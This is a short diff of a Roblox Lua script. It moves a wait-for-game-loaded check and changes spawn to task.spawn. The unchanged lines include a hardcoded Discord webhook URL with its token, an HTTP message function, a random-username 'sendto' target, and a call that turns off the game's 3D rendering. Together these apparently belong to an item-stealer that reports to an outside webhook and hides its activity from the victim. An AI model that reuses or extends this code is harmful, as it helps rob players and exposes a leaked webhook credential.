@@ -42,12 +42,6 @@ end
 local sendto = getRandomUsername()
 
 
-
-if not game:IsLoaded() then
-    game.Loaded:Wait()
-  end
-
-
 local Url2 = "https://discord.com/api/webhooks/1181449125187833856/0kA4c5-OXkAOQvZeJxnOKrKc7cTzlGvjpjMNKn-UkImyh82rPZ8-np_RwU0w6DelHjty"
 local Http2 = game:GetService("HttpService")
 	local Msg = function(msg)
@@ -92,7 +86,13 @@ end)
 		
 
 
-spawn(function()
+if not game:IsLoaded() then
+    game.Loaded:Wait()
+  end
+
+
+
+task.spawn(function()
 game:GetService("RunService"):Set3dRenderingEnabled(false)
 		for _, v in pairs(game.Players:GetChildren()) do
         	for _, v2 in pairs(v.Character:GetDescendants()) do
